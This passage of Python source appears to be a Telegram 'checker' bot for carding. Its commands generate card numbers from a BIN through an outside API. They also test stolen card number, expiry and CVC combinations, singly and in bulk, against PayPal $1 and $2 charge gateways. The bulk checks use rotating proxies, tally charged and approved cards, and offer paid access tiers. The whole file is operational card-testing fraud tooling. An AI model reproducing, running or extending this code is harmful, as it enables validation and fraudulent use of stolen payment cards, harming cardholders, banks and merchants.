        if len(parts) < 2:
            bot.reply_to(message, "❌ Please provide a BIN number.\n\nUsage: /gen 559888 or /gen 55988852")
            return
        
        bin_input = parts[1].strip()
        bin_match = re.match(r'(\d{6,16})', bin_input)
        if not bin_match:
            bot.reply_to(message, "❌ Invalid BIN format. Please provide 6-16 digits.\n\nExample: /gen 559888")
            return
        
        bin_number = bin_match.group(1)
        bin_padded = bin_number.ljust(16, 'x') if len(bin_number) == 6 else bin_number
        
        processing_msg = bot.reply_to(message, "⏳ Generating credit cards...")
        
        cc_url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_padded}&count=10"
        bin_url = f"https://drlabapis.onrender.com/api/bin?bin={bin_number[:6]}"
        
        cc_response = requests.get(cc_url, timeout=15)
        bin_response = requests.get(bin_url, timeout=15)
        
        if cc_response.status_code != 200:
            bot.edit_message_text(
                f"❌ API Error: Unable to generate cards (Status: {cc_response.status_code})",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            return
        
        cards_list = cc_response.text.strip().split("\n")
        
        if not cards_list or len(cards_list) == 0:
            bot.edit_message_text(
                "❌ No cards were generated. Please try a different BIN.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            return
        
        bin_info = {}
        if bin_response.status_code == 200:
            try:
                bin_data = bin_response.json()
                country_name = bin_data.get('country', 'NOT FOUND').upper()
                country_flags = {
                    "FRANCE": "🇫🇷", "UNITED STATES": "🇺🇸", "BRAZIL": "🇧🇷", "NAMIBIA": "🇳🇦",
                    "INDIA": "🇮🇳", "GERMANY": "🇩🇪", "THAILAND": "🇹🇭", "MEXICO": "🇲🇽", "RUSSIA": "🇷🇺",
                }
                bin_info = {
                    "bank": bin_data.get('issuer', 'NOT FOUND').upper(),
                    "card_type": bin_data.get('type', 'NOT FOUND').upper(),
                    "network": bin_data.get('scheme', 'NOT FOUND').upper(),
                    "tier": bin_data.get('tier', 'NOT FOUND').upper(),
                    "country": country_name,
                    "flag": country_flags.get(country_name, "🏳️")
                }
            except:
                bin_info = {
                    "bank": "NOT FOUND",
                    "card_type": "NOT FOUND",
                    "network": "NOT FOUND",
                    "tier": "NOT FOUND",
                    "country": "NOT FOUND",
                    "flag": "🏳️"
                }
        else:
            bin_info = {
                "bank": "NOT FOUND",
                "card_type": "NOT FOUND",
                "network": "NOT FOUND",
                "tier": "NOT FOUND",
                "country": "NOT FOUND",
                "flag": "🏳️"
            }
        
        cards_text = '\n'.join([f"<code>{card.upper()}</code>" for card in cards_list])
        
        response_text = f"""𝗕𝗜𝗡 ⇾ <code>{bin_number[:6]}</code>
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ <code>{len(cards_list)}</code>

{cards_text}

𝗜𝗻𝗳𝗼: {bin_info['card_type']} - {bin_info['network']} ({bin_info['tier']})
𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info['bank']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['flag']}"""
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode='HTML'
        )
        
    except requests.exceptions.Timeout:
        bot.reply_to(message, "❌ API request timed out. Please try again.")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ Network error: {str(e)}")
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error generating cards: {safe_error}")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('/p1') or message.text.lower().startswith('.p1')))
def p1_single_check(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_status = get_user_status(message.from_user.id)
        
        # Check cooldown for single check commands
        can_proceed, remaining = check_single_command_cooldown(message.from_user.id)
        if not can_proceed:
            bot.reply_to(message, f"⏳ Please wait {remaining} seconds before using another check command.")
            return
        
        command_text = message.text.strip()
        parts = command_text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ Please provide card details.\n\nUsage: /p1 5599889999999999|12|2026|123")
            return
        
        card_info = parts[1].strip()
        card_parts = re.split('[|/:]', card_info)
        
        if len(card_parts) < 4:
            bot.reply_to(message, "❌ Invalid card format.\n\nUsage: /p1 5599889999999999|12|2026|123")
            return
        
        n = card_parts[0]
        mm = card_parts[1]
        yy = card_parts[2]
        cvc = card_parts[3]
        
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" in yy:
            yy = yy.split("20")[1]
        
        ko = bot.reply_to(message, "■□□□□").message_id
        
        stop_animation = threading.Event()
        animation_thread = threading.Thread(
            target=animate_checking,
            args=(message.chat.id, ko, "PAYPAL 1$", stop_animation),
            daemon=True
        )
        animation_thread.start()
        
        start_time = time.time()
        
        status, response = paypal_1dollar_check(n, mm, yy, cvc)
        
        stop_animation.set()
        animation_thread.join(timeout=1)
        
        elapsed_time = time.time() - start_time
        
        card_display = f"{n}|{mm}|{yy}|{cvc}"
        
        # Get BIN information
        bin_data = get_bin_info(card_display)
        
        # Get user info
        user_name = message.from_user.first_name or "Unknown"
        user_status = get_user_status(message.from_user.id)
        if user_status == 'owner':
            plan_display = 'OWNER 👑'
        elif user_status == 'premium':
            plan_display = 'VIP 🥇'
        else:
            plan_display = 'FREE'
        
        response_text = f"""<b>[#PayPal 1$] | Legend ◆</b>

<b>[•] Card-</b> <code>{html.escape(card_display)}</code>
<b>[•] Gateway -</b> <code>PayPal 1$</code>
<b>[•] Status-</b> <code>{html.escape(status)}</code>
<b>[•] Response-</b> <code>{html.escape(str(response)[:200])}</code>
______________________
<b>[+] Bin:</b> <code>{html.escape(bin_data['bin'])}</code>
<b>[+] Info:</b> <code>{html.escape(bin_data['info'])}</code>
<b>[+] Bank:</b> <code>{html.escape(bin_data['bank'])}</code> 🏛
<b>[+] Country:</b> <code>{html.escape(bin_data['country'])}</code> ━ [{bin_data['flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{html.escape(user_name)} [{plan_display}]</code>
<b>[ϟ] Dev ➜</b> <i><a href="tg://user?id={OWNER_ID}">E V I L ~</a></i>

<b>[ϟ] T/t:</b> [<code>{elapsed_time:.2f} s</code>]"""
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=ko,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('/pp') or message.text.lower().startswith('.pp')))
def pp_single_check(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_status = get_user_status(message.from_user.id)
        
        # Check cooldown for single check commands
        can_proceed, remaining = check_single_command_cooldown(message.from_user.id)
        if not can_proceed:
            bot.reply_to(message, f"⏳ Please wait {remaining} seconds before using another check command.")
            return
        
        command_text = message.text.strip()
        parts = command_text.split()
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ Please provide card details.\n\nUsage: /pp 5599889999999999|12|2026|123")
            return
        
        card_info = parts[1].strip()
        card_parts = re.split('[|/:]', card_info)
        
        if len(card_parts) < 4:
            bot.reply_to(message, "❌ Invalid card format.\n\nUsage: /pp 5599889999999999|12|2026|123")
            return
        
        n = card_parts[0]
        mm = card_parts[1]
        yy = card_parts[2]
        cvc = card_parts[3]
        
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" in yy:
            yy = yy.split("20")[1]
        
        ko = bot.reply_to(message, "■□□□□").message_id
        
        stop_animation = threading.Event()
        animation_thread = threading.Thread(
            target=animate_checking,
            args=(message.chat.id, ko, "PAYPAL 2$", stop_animation),
            daemon=True
        )
        animation_thread.start()
        
        start_time = time.time()
        
        status, response = paypal_check(n, mm, yy, cvc)
        
        stop_animation.set()
        animation_thread.join(timeout=1)
        
        elapsed_time = time.time() - start_time
        
        card_display = f"{n}|{mm}|{yy}|{cvc}"
        
        # Get BIN information
        bin_data = get_bin_info(card_display)
        
        # Get user info
        user_name = message.from_user.first_name or "Unknown"
        user_status = get_user_status(message.from_user.id)
        if user_status == 'owner':
            plan_display = 'OWNER 👑'
        elif user_status == 'premium':
            plan_display = 'VIP 🥇'
        else:
            plan_display = 'FREE'
        
        response_text = f"""<b>[#PayPal 2$] | Legend ◆</b>

<b>[•] Card-</b> <code>{html.escape(card_display)}</code>
<b>[•] Gateway -</b> <code>PayPal 2$</code>
<b>[•] Status-</b> <code>{html.escape(status)}</code>
<b>[•] Response-</b> <code>{html.escape(str(response)[:200])}</code>
______________________
<b>[+] Bin:</b> <code>{html.escape(bin_data['bin'])}</code>
<b>[+] Info:</b> <code>{html.escape(bin_data['info'])}</code>
<b>[+] Bank:</b> <code>{html.escape(bin_data['bank'])}</code> 🏛
<b>[+] Country:</b> <code>{html.escape(bin_data['country'])}</code> ━ [{bin_data['flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{html.escape(user_name)} [{plan_display}]</code>
<b>[ϟ] Dev ➜</b> <i><a href="tg://user?id={OWNER_ID}">E V I L ~</a></i>

<b>[ϟ] T/t:</b> [<code>{elapsed_time:.2f} s</code>]"""
        
        bot.edit_message_text(
            response_text,
            chat_id=message.chat.id,
            message_id=ko,
            parse_mode='HTML'
        )
        
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error: {safe_error}")

def run_mp1_thread(message, cards, total, ko, is_from_file=False):
    """Background thread for mass paypal 1$ checking"""
    user_id = str(message.from_user.id)
    
    # Set delay: 1 second for /mp1 command
    delay_seconds = 1
    
    try:
        charged_count = 0
        approved_count = 0
        ccn_count = 0
        declined_count = 0
        error_count = 0
        three_d_count = 0
        restricted_count = 0
        
        charged_cards = []
        approved_cards = []
        
        start_time = time.time()
        idx = 0
        
        for idx, card in enumerate(cards, 1):
            with stop_flags_lock:
                should_stop = stop_flags.get(user_id, False)
            
            if should_stop:
                bot.edit_message_text("🛑 Mass checking stopped by user.", chat_id=message.chat.id, message_id=ko)
                break
            
            card_parts = re.split(r'[|/:\s]', card.strip())
            n = card_parts[0]
            mm = card_parts[1]
            yy = card_parts[2]
            cvc = card_parts[3]
            
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" in yy:
                yy = yy.split("20")[1]
            
            # Get rotating proxy for this user
            proxy = get_next_proxy(user_id=message.from_user.id)
            status, response = paypal_1dollar_check(n, mm, yy, cvc, proxy=proxy)
            
            card_display = f"{n}|{mm}|{yy}|{cvc}"
            
            if 'CHARGE' in status:
                charged_count += 1
                charged_cards.append(card_display)
            elif 'CCN' in status:
                ccn_count += 1
                approved_cards.append(card_display)
            elif 'APPROVED' in status:
                approved_count += 1
                approved_cards.append(card_display)
            elif 'RESTRICTED' in status:
                restricted_count += 1
                approved_cards.append(card_display)
            elif '3D' in status:
                three_d_count += 1
            elif 'DECLINED' in status:
                declined_count += 1
            else:
                error_count += 1
            
            elapsed = time.time() - start_time
            progress_msg = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss ᴘᴀʏᴘᴀʟ 1$ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>Progress:</b> {idx}/{total}
<b>Charged 💰:</b> {charged_count}
<b>Approved ✅:</b> {approved_count}
<b>CCN ✅:</b> {ccn_count}
<b>Restricted ✅:</b> {restricted_count}
<b>3D ⚡:</b> {three_d_count}
<b>Declined ❌:</b> {declined_count}
<b>Error ⚠️:</b> {error_count}

<b>Time:</b> {elapsed:.1f}s"""
            
            if idx % 5 == 0 or idx == total:
                try:
                    bot.edit_message_text(progress_msg, chat_id=message.chat.id, message_id=ko, parse_mode='HTML')
                except:
                    pass
            
            time.sleep(delay_seconds)
        
        total_time = time.time() - start_time
        
        final_msg = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
✅ ᴍᴀss ᴄʜᴇᴄᴋɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>Total Checked:</b> {idx}/{total}
<b>Charged 💰:</b> {charged_count}
<b>Approved ✅:</b> {approved_count}
<b>CCN ✅:</b> {ccn_count}
<b>Restricted ✅:</b> {restricted_count}
<b>3D ⚡:</b> {three_d_count}
<b>Declined ❌:</b> {declined_count}
<b>Error ⚠️:</b> {error_count}

<b>Total Time:</b> {total_time:.1f}s
<b>Checked By:</b> E V I L  X ⚡TEAM LEGEND"""
        
        bot.edit_message_text(final_msg, chat_id=message.chat.id, message_id=ko, parse_mode='HTML')
        
        # Clean up (no file sending)
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
    
    except Exception as e:
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
        
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error in mass check: {safe_error}")

def run_mpp_thread(message, cards, total, ko, is_from_file=False):
    """Background thread for mass paypal checking"""
    user_id = str(message.from_user.id)
    
    # Set delay: 1 second for /mpp command
    delay_seconds = 1
    
    try:
        charged_count = 0
        approved_count = 0
        ccn_count = 0
        declined_count = 0
        error_count = 0
        three_d_count = 0
        restricted_count = 0
        
        charged_cards = []
        approved_cards = []
        
        start_time = time.time()
        idx = 0
        
        for idx, card in enumerate(cards, 1):
            with stop_flags_lock:
                should_stop = stop_flags.get(user_id, False)
            
            if should_stop:
                bot.edit_message_text("🛑 Mass checking stopped by user.", chat_id=message.chat.id, message_id=ko)
                break
            
            card_parts = re.split(r'[|/:\s]', card.strip())
            n = card_parts[0]
            mm = card_parts[1]
            yy = card_parts[2]
            cvc = card_parts[3]
            
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" in yy:
                yy = yy.split("20")[1]
            
            # Get rotating proxy for this user
            proxy = get_next_proxy(user_id=message.from_user.id)
            status, response = paypal_check(n, mm, yy, cvc, proxy=proxy)
            
            card_display = f"{n}|{mm}|{yy}|{cvc}"
            
            if 'CHARGE' in status:
                charged_count += 1
                charged_cards.append(card_display)
            elif 'CCN' in status:
                ccn_count += 1
                approved_cards.append(card_display)
            elif 'APPROVED' in status:
                approved_count += 1
                approved_cards.append(card_display)
            elif 'RESTRICTED' in status:
                restricted_count += 1
                approved_cards.append(card_display)
            elif '3D' in status:
                three_d_count += 1
            elif 'DECLINED' in status:
                declined_count += 1
            else:
                error_count += 1
            
            elapsed = time.time() - start_time
            progress_msg = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss ᴘᴀʏᴘᴀʟ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>Progress:</b> {idx}/{total}
<b>Charged 💰:</b> {charged_count}
<b>Approved ✅:</b> {approved_count}
<b>CCN ✅:</b> {ccn_count}
<b>Restricted ✅:</b> {restricted_count}
<b>3D ⚡:</b> {three_d_count}
<b>Declined ❌:</b> {declined_count}
<b>Error ⚠️:</b> {error_count}

<b>Time:</b> {elapsed:.1f}s"""
            
            if idx % 5 == 0 or idx == total:
                try:
                    bot.edit_message_text(progress_msg, chat_id=message.chat.id, message_id=ko, parse_mode='HTML')
                except:
                    pass
            
            time.sleep(delay_seconds)
        
        total_time = time.time() - start_time
        
        final_msg = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
✅ ᴍᴀss ᴄʜᴇᴄᴋɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>Total Checked:</b> {idx}/{total}
<b>Charged 💰:</b> {charged_count}
<b>Approved ✅:</b> {approved_count}
<b>CCN ✅:</b> {ccn_count}
<b>Restricted ✅:</b> {restricted_count}
<b>3D ⚡:</b> {three_d_count}
<b>Declined ❌:</b> {declined_count}
<b>Error ⚠️:</b> {error_count}

<b>Total Time:</b> {total_time:.1f}s
<b>Checked By:</b> E V I L  X ⚡TEAM LEGEND"""
        
        bot.edit_message_text(final_msg, chat_id=message.chat.id, message_id=ko, parse_mode='HTML')
        
        # Clean up (no file sending)
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
    
    except Exception as e:
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
        
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error in mass check: {safe_error}")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('/mp1') or message.text.lower().startswith('.mp1')))
def mp1_mass_check(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_status = get_user_status(message.from_user.id)
        
        if user_status == 'free':
            bot.reply_to(message, '''⛔ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
You are not authorized to use this bot.
Contact admin for access key.

Owner: @Evilvx
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ E V I L ''')
            return
        
        user_id = str(message.from_user.id)
        
        with active_checks_lock:
            if user_id in active_mass_checks:
                bot.reply_to(message, "⚠️ Please wait, you already have a checking session running. Please let it complete first.")
                return
            
            active_mass_checks[user_id] = True
        
        with stop_flags_lock:
            stop_flags[user_id] = False
        
        ko = bot.reply_to(message, """━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss ᴘᴀʏᴘᴀʟ 1$ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━""").message_id
        
        # Get card details from text only (no file support)
        cc_text = ""
        is_from_file = False
        
        if message.reply_to_message and message.reply_to_message.text:
            cc_text = message.reply_to_message.text
        else:
            parts = message.text.split(maxsplit=1)
            if len(parts) > 1:
                cc_text = parts[1]
            else:
                bot.edit_message_text("❌ Please provide cards in format:\n/mp1 card1\ncard2\ncard3", chat_id=message.chat.id, message_id=ko)
                del active_mass_checks[user_id]
                return
        
        cards = re.findall(r'\d{15,16}[|/:\s]\d{1,2}[|/:\s]\d{2,4}[|/:\s]\d{3,4}', cc_text)
        
        if not cards:
            bot.edit_message_text("❌ No valid cards found in the provided text.", chat_id=message.chat.id, message_id=ko)
            del active_mass_checks[user_id]
            return
        
        # Limit for /mp1 command: owner=infinity, premium=50, others=20
        user_status = get_user_status(message.from_user.id)
        if user_status == 'owner':
            limit = float('inf')
        elif user_status == 'premium':
            limit = 50
        else:
            limit = 20
        
        if limit != float('inf'):
            cards = cards[:int(limit)]
        total = len(cards)
        
        thread = threading.Thread(
            target=run_mp1_thread,
            args=(message, cards, total, ko, is_from_file),
            daemon=True
        )
        thread.start()
        
    except Exception as e:
        user_id = str(message.from_user.id)
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
        
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error starting mass check: {safe_error}")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('/mpp') or message.text.lower().startswith('.mpp')))
def mpp_mass_check(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_status = get_user_status(message.from_user.id)
        
        if user_status == 'free':
            bot.reply_to(message, '''⛔ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
You are not authorized to use this bot.
Contact admin for access key.

Owner: @Evilvx
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ E V I L ''')
            return
        
        user_id = str(message.from_user.id)
        
        with active_checks_lock:
            if user_id in active_mass_checks:
                bot.reply_to(message, "⚠️ Please wait, you already have a checking session running. Please let it complete first.")
                return
            
            active_mass_checks[user_id] = True
        
        with stop_flags_lock:
            stop_flags[user_id] = False
        
        ko = bot.reply_to(message, """━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss ᴘᴀʏᴘᴀʟ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━""").message_id
        
        # Get card details from text only (no file support)
        cc_text = ""
        is_from_file = False
        
        if message.reply_to_message and message.reply_to_message.text:
            cc_text = message.reply_to_message.text
        else:
            parts = message.text.split(maxsplit=1)
            if len(parts) > 1:
                cc_text = parts[1]
            else:
                bot.edit_message_text("❌ Please provide cards in format:\n/mpp card1\ncard2\ncard3", chat_id=message.chat.id, message_id=ko)
                del active_mass_checks[user_id]
                return
        
        cards = re.findall(r'\d{15,16}[|/:\s]\d{1,2}[|/:\s]\d{2,4}[|/:\s]\d{3,4}', cc_text)
        
        if not cards:
            bot.edit_message_text("❌ No valid cards found in the provided text.", chat_id=message.chat.id, message_id=ko)
            del active_mass_checks[user_id]
            return
        
        # Limit for /mpp command: owner=infinity, premium=50, others=20
        user_status = get_user_status(message.from_user.id)
        if user_status == 'owner':
            limit = float('inf')
        elif user_status == 'premium':
            limit = 50
        else:
            limit = 20
        
        if limit != float('inf'):
            cards = cards[:int(limit)]
        total = len(cards)
        
        # Spawn background thread for heavy work
        thread = threading.Thread(
            target=run_mpp_thread,
            args=(message, cards, total, ko, is_from_file),
            daemon=True
        )
        thread.start()
        
    except Exception as e:
        user_id = str(message.from_user.id)
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
        
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error starting mass check: {safe_error}")

print("                          Bot Start On ✅  ")
bot.infinity_polling(timeout=30, long_polling_timeout=30)